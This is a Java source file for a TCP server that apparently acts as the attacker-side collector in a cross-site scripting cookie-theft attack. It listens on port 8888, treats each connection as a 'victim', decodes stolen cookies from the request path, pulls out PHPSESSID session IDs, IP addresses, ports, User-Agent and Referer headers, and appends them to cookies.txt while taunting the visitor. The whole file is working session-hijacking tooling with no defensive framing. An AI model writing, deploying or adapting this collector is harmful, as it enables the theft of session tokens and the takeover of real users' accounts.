import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class TCPServer {

	private static final int PORT = 8888;
	
	public static void main(String[] args) throws IOException {
		
		File file = new File("cookies.txt");
		if(!file.exists()) {
			file.createNewFile();
		}
		
		FileWriter fileWriter = new FileWriter(file, true);
		BufferedWriter bWriter = new BufferedWriter(fileWriter);
		
		ServerSocket server = new ServerSocket(PORT);
		
		while(true) {
			Socket newVictim = server.accept();
			System.out.println("New victim is connected to server!");
			
			InputStream readRequest = newVictim.getInputStream();
			byte[] buf= new byte[4096];
			readRequest.read(buf);
			String httpPayload = new String(buf,"UTF-8");
			
			PrintWriter writeResponse = new PrintWriter(newVictim.getOutputStream());
			String response= "HTTP/1.0 200 OK\r\n"+
			"\r\n"+
			"<TITLE>Response</TITLE>"+
			"<P>You are hacked, idiot!</P>";
			OutputStream os = newVictim.getOutputStream();
            os.write(response.getBytes());
            
            readRequest.close();
            os.close();
			
			String[] payloadElements=httpPayload.split("\n");
			String[] forCookie=payloadElements[0].split(" ");
			String cookieEncoded="";
			if(forCookie[1].length()>7) {
				cookieEncoded=forCookie[1].substring(7);
			}
			String result = java.net.URLDecoder.decode(cookieEncoded, StandardCharsets.UTF_8);
			
			//0:Date 1:Cookie 2:SessionID 3:ClientIP 4:ClientPort 5:Browser_OS 6:Referrer
			String[] results= {null,null,null,null,null,null,null};
			
			LocalDateTime myDateObj = LocalDateTime.now();
		    DateTimeFormatter myFormatObj = DateTimeFormatter.ofPattern("dd-MM-yyyy HH:mm:ss");
		    String formattedDate = myDateObj.format(myFormatObj);
		    results[0]="Date: "+formattedDate+"\n";
		    
			String[] cookieElements=result.split(" ");
			String[] str=cookieElements[0].split("=");
			if(str.length>1) results[3]="IP: "+str[1]+"\n";
			
			String cookie="";
			for(int i=1;i<cookieElements.length;i++) {
				cookie=cookie+cookieElements[i];
				if(i!=cookieElements.length-1) cookie=cookie+"; ";
				
				str=cookieElements[i].split("=");
				if(str.length>1 && str[0].equals("PHPSESSID")) results[2]="Session ID: "+str[1]+"\n";
			}
			results[1]="Cookie: "+cookie+"\n";
			results[4]="Port: "+newVictim.getPort()+"\n";
			
			for(int i=1;i<payloadElements.length;i++) {
				if(payloadElements[i].contains("User-Agent")) results[5]=payloadElements[i]+"\n";
				else if(payloadElements[i].contains("Referer")) results[6]=payloadElements[i]+"\n";
			}
            
            String returnValue="";
            for(int i=0;i<results.length;i++) {
            	if(results[i]!=null) returnValue=returnValue+results[i];
            }
            returnValue=returnValue+"==============================================================================================\n";
            
            newVictim.close();
            
            bWriter.append(returnValue);
            bWriter.flush();
			System.out.println("Informations of victim are saved!");
		}

	}

}
